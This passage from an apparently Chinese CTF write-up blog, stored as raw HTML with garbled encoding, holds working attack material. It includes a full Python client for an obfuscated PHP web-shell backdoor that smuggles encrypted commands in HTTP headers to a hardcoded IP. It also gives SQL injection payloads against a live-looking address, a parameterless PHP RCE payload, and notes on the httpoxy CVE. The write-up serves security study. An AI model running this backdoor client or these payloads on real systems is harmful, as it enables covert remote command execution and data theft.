class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span>(<span class="params">seq, amount</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt &lt; lenTxt <span class="keyword">and</span> iKey &lt; lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;3481&quot;</span>  <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;9d7b&quot;</span>  <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://42.192.64.28:8083/shell.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span>  <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages, <span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>, <span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload, xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url, headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>: acceptLangStr, <span class="string">&#x27;Referer&#x27;</span>: refe                                                                                   rer&#125;, proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey, xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output, xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ”¹æ‰ä¸­é—´çš„urlå’Œkeyå°±å¯ä»¥äº†ï¼Œpy2çš„<br><img src="/images/tjuctf/6.png" alt="image-20220124201741117"><br>ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œå…·ä½“åŸå› å˜›ï¼Œè¿˜éœ€è¦ç»§ç»­ç ”ç©¶ç ”ç©¶</p><h5 id="è¿™ä¸ªdocä¸å¯¹åŠ²"><a href="#è¿™ä¸ªdocä¸å¯¹åŠ²" class="headerlink" title="è¿™ä¸ªdocä¸å¯¹åŠ²"></a>è¿™ä¸ªdocä¸å¯¹åŠ²</h5><p>è¿™ä¸ªé¢˜å¥½ç©ï¼Œæ¯”è¾ƒæœ‰è¶£ï¼Œä½†æ˜¯ä¸­é—´å‡ºç°äº†ä¸€äº›æ„å¤–ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…<br>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ä¸ªdocï¼Œæ˜¾ç„¶60M+çš„docä¸å¤ªç°å®ï¼Œç›´æ¥æ”¹æˆzipåŒ…<br>æœ‰ä¸€ä¸ªkey.txtï¼Œé¢„è§ˆçœ‹ä¸å¤ªæ­£å¸¸ï¼Œå¯èƒ½æ˜¯0å®½ï¼Œç½‘ç«™æ‰“ä¸€ä¸‹<br><img src="/images/tjuctf/7.png" alt="image-20220124202818555"><br>åˆšå¼€å§‹ä»¥ä¸ºè¦æ©ç çˆ†ç ´ï¼Œä½†æ˜¯æ²¡è·‘å‡ºæ¥ï¼Œé—®äº†ä¸‹å‡ºé¢˜äººï¼Œé¢˜æœ‰äº›é—®é¢˜ï¼Œç›´æ¥ç»™å¯†ç äº†è§£ä¸€ä¸‹å‹ç¼©åŒ…<br><code>Because I like naruto best</code><br>è§£ä¸€ä¸‹å‹ç¼©åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šå›¾ç‰‡ï¼Œä¸€å…±129488å¼ ï¼Œçœ‹å°å›¾ç‰‡æ˜¯ä¸¤ç§ä¸ä¸€æ ·çš„å›¾ç‰‡ï¼Œç›²çŒœè½¬01ï¼Œå…«ä¸ªä¸ºä¸€ä½ï¼Œè½¬asciiè½¬å‡ºæ¥å°±å¯ä»¥äº†ï¼Œäººå·¥è‚¯å®šä¸ç°å®ï¼Œè´´ä¸€ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = 104329</span></span><br><span class="line"><span class="comment"># for i in range(300,400):</span></span><br><span class="line"><span class="comment">#     if int(i)*int(i)==a:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\tj\\tjtest.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130000</span>):</span><br><span class="line">    <span class="comment">#å…«ä¸ªä¸ºä¸€ç»„å…«ä¸ªåè¾“å‡ºå›è½¦</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(i)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#è¯»å–æ‰€æœ‰æ–‡ä»¶å¤¹ä¸‹å›¾ç‰‡ï¼Œæ ¹æ®getsizeåˆ¤æ–­</span></span><br><span class="line">    a=os.path.getsize(<span class="string">&#x27;C:\\Users\\xin\\Desktop\\love\\out\\&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">262</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        fi.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tj\\tjtest.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        i = i.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯getsizeæ˜¯åˆ¤æ–­å›¾ç‰‡çš„å­—èŠ‚<br><img src="/images/tjuctf/8.png" alt="image-20220124203834234"><br>è¿è¡Œå‡ºæ¥ï¼Œæ˜¯base64å›¾ç‰‡ï¼Œç›´æ¥å¤åˆ¶åˆ°æµè§ˆå™¨å°±å¥½äº†<br><img src="/images/tjuctf/9.png" alt="image-20220124204133045"><br><img src="/images/tjuctf/10.png" alt="image-20220125181954185"><br>è¾“å‡ºçš„ä¸œè¥¿ç›´æ¥æ”¾åˆ°æµè§ˆå™¨è¿è¡Œå°±å¯ä»¥äº†</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h5><p>sqlæ³¨å…¥æ²¡æœ‰ä»»ä½•è¿‡æ»¤,ç›´æ¥æ‰“å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(schema_name),version(),version() from information_schema.schemata-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(table_name),version(),version() from information_schema.tables where table_schema=&#x27;CTF&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(column_name),version(),version() from information_schema.columns where table_schema=&#x27;CTF&#x27; and table_name=&#x27;flag&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),flag,null,null from CTF.flag-- -</span><br></pre></td></tr></table></figure><h5 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h5><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå‰ç«¯æ£€æµ‹ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªpngå›¾ç‰‡æŠ“åŒ…ï¼Œç„¶åæ”¹åç¼€ï¼Œcat  /flagå³å¯<br><img src="/images/tjuctf/11.png" alt="image-20220125194611835"></p><h5 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h5><p>ctfshowååºåˆ—åŒ–åŸé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬,<img src="/images/tjuctf/12.png" alt="image-20220125195719749"><br>æ‰“ä¸€ä¸‹å°±å¯ä»¥äº†,è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹urlç¼–ç ä¸€ä¸‹</p><h5 id="RCE-fun"><a href="#RCE-fun" class="headerlink" title="RCE_fun"></a>RCE_fun</h5><p>emmm  ä¸ä¼šï¼Œåæ¥çœ‹äº†ä¸‹wpï¼Œemmmè¿˜å¯ä»¥è¿™æ ·  ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œåé¢ç ”ç©¶ä¸€ä¸‹</p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h5 id="modulus"><a href="#modulus" class="headerlink" title="modulus"></a>modulus</h5><p>ç»™äº†ä¸€ä¸ªå¤§nï¼Œe1å’Œe2ï¼Œc1ï¼Œc2ï¼Œå…±æ¨¡æ”»å‡»ç›´æ¥ä¸€æŠŠæ¢­<br><img src="/images/tjuctf/13.png" alt="image-20220125200608676"></p><h4 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h4><p>emmmm ä¸èƒ½ç®—åšå‡ºæ¥å§ï¼Œç›´æ¥è½¯ä»¶ä¸€æŠŠæ¢­çš„ï¼Œ<br><img src="/images/tjuctf/14.png" alt=" "></p><p><img src="/images/tjuctf/15.png" alt="image-20220125193800648"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>å¤ªèœäº†ï¼Œcscmsæ²¡åšå‡ºæ¥ï¼Œä¸­é—´æœäº†ä¸€ä¸ªä¸Šä¼ æ¼æ´çœ‰ä¹Ÿæ²¡æœ‰æ‰“é€šï¼Œå°±æ²¡ç®¡äº†ã€‚<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›</title>
      <link href="/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; </code>è¿™é‡Œæ­£åˆ™åŒ¹é…äº†è¾“å…¥çš„codeå­—ç¬¦ï¼Œæœ‰å‚æ•°å°±ä¼šæ›¿æ¢ä¸ºç©ºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥<code>?code=phpinfo();</code>å°±ä¼šæ˜¾ç¤ºphpinfoä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœ<code>system(&#39;ls&#39;);</code>è¿™æ ·å°±ä¼šè¢«è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ‹¬å·é‡Œä¸èƒ½æœ‰å‚æ•°ï¼Œå¯ä»¥è¿™æ ·<code>a(b())</code>,ä½†æ˜¯ä¸èƒ½è¿™æ ·<code>a(&#39;b&#39;)</code>ï¼Œå°±æ˜¯æ— å‚æ•°rceã€‚<br>è¿™è¾¹æˆ‘çœ‹åˆ°é¢˜<code>if(!preg_match(&#39;/session|end|next|header|dir/i&#39;,$_GET[&#39;code&#39;]))&#123;</code><br>å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ­£å¸¸æˆ‘ä»¬æœ‰ä¸¤ç§é€‰æ‹©ä¸€ç§rceï¼Œä¸€ç§æ–‡ä»¶è¯»å–ï¼Œ<br>é¢˜ç›®ä¹Ÿç»™æˆ‘ä»¬äº† æç¤ºrceï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†endï¼Œheaderï¼Œsessionï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>get_defined_vars ()</code>å‡½æ•°<br>get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„<br><img src="/images/changanzhanyi/1.png" alt="1"><br>getä¼ å‚åæ•°ç»„é‡Œå°±ä¼šæœ‰getä¼ é€’çš„å€¼</p><p>current : è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œæ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒâ€œå½“å‰çš„â€å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒã€‚</p><p>å’Œcurrentç±»ä¼¼çš„å‡½æ•°<br>end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>a=eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br>æ„é€ payload<br>è¿™é‡Œè¿‡æ»¤äº†end  æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨resetä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ <br>æŠŠä¼ é€’çš„å‚æ•°å†™å‰é¢ï¼Œè¿™æ ·<code>a=phpinfo();&amp;code=eval(reset(current(get_defined_vars())))</code><br>éšä¾¿ä¼ ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¦æ”¾åœ¨æœ€å‰é¢è¿™æ ·çš„è¯å°±å¯ä»¥è¿›è¡Œrceäº†<br><img src="/images/changanzhanyi/2.png" alt="image-20220118141207013"></p><h5 id="flagé…é€ä¸­å¿ƒ"><a href="#flagé…é€ä¸­å¿ƒ" class="headerlink" title="flagé…é€ä¸­å¿ƒ"></a>flagé…é€ä¸­å¿ƒ</h5><p>emmmmå¤ªèœäº†  ä¸ä¼šï¼Œå³é”®æºä»£ç æœ‰æç¤ºï¼Œ<!--Powered by PHP 5.6.23 + fastcgi--><br>å¤ç°ä¸€ä¸‹ï¼Œ<code>CVE-2016-5385 </code><br>æŠ“åŒ…ï¼ŒåŒ…é‡ŒåŠ ä¸Š<code>Proxy: http://xxx.xxx.xxx.xxx:xxxx/</code><br>å°±å¯ä»¥äº†ï¼Œvpsç›‘å¬ä¸€ä¸‹ï¼Œè¯¦ç»†ï¼Œç™¾åº¦ cve-2016-5385<br><img src="/images/changanzhanyi/31.png" alt="image-20220120164323864"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="è¥¿å®‰åŠ æ²¹"><a href="#è¥¿å®‰åŠ æ²¹" class="headerlink" title="è¥¿å®‰åŠ æ²¹"></a>è¥¿å®‰åŠ æ²¹</h5><p>æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œæ”¾åˆ°networkæµé‡çœ‹åˆ°æœ‰ä¸€ä¸ªsecret.txtå’Œhint.txtçš„æµé‡åŒ…ä¸ä¸€æ ·å¤§ï¼Œç›´æ¥å³é”®æå‡ºæ¥ï¼Œ<br><img src="/images/changanzhanyi/3.png" alt="image-20220118151527186"><br><img src="/images/changanzhanyi/4.png" alt="image-20220118151613193"><br><img src="/images/changanzhanyi/5.png" alt="image-20220118152247852"><br>æ˜¾ç„¶è¿™é‡Œbase64è½¬ä¸€ä¸‹secretå†…å®¹pkå¼€å¤´æ˜¯ä¸€ä¸ªzipåŒ…ï¼Œæˆ‘ä»¬ä¿å­˜ä¸‹æ¥ï¼Œæ”¹ä¸€ä¸‹åç¼€ï¼Œè§£å‹ä¸€ä¸‹é‡Œé¢æ˜¯å¾ˆå¤šå›¾ç‰‡ï¼Œæ‹¼å›¾ï¼Œå†çœ‹ä¸€ä¸‹hint.txt,<br><img src="/images/changanzhanyi/6.png" 